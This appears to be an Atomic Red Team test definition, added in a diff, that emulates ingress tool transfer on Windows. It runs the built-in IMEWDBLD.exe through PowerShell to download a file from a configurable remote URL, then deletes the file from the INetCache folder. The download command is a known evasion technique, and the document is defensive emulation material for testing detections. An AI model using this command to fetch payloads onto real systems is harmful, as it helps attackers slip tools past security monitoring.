@@ -1,0 +1,58 @@
+{
+  "id": "1a02df58-09af-4064-a765-0babe1a0d1e2",
+  "name": "Download a file with IMEWDBLD.exe",
+  "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\\u003c8_RANDOM_ALNUM_CHARS\u003e/\u003cFILENAME\u003e[1].\u003cEXTENSION\u003e\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\\u003c8_RANDOM_ALNUM_CHARS\u003e/\u003cFILENAME\u003e[1].\u003cEXTENSION\u003e.\nRun \"Get-ChildItem -Path C:\\Users\\\u003cUSERNAME\u003e\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include \u003cFILENAME\u003e* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "02dd3767-678c-4a88-bf4a-47151f786da5",
+      "type": "execute-command",
+      "data": {
+        "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n\u0026 $imewdbled #{remote_url}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0e7a5835-ed4f-4165-ba9c-b85d2d560604",
+      "type": "execute-command",
+      "data": {
+        "command": "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "02dd3767-678c-4a88-bf4a-47151f786da5",
+      "p": "on-success",
+      "o": "0e7a5835-ed4f-4165-ba9c-b85d2d560604"
+    },
+    {
+      "s": "02dd3767-678c-4a88-bf4a-47151f786da5",
+      "p": "on-failure",
+      "o": "0e7a5835-ed4f-4165-ba9c-b85d2d560604"
+    }
+  ],
+  "tags": [
+    "T1105",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_url",
+      "type": "url",
+      "description": "Location of file to be downloaded.",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml"
+    },
+    {
+      "name": "file_name",
+      "type": "string",
+      "description": "Name of the file to be downloaded without extension.",
+      "value": "T1105"
+    }
+  ]
+}
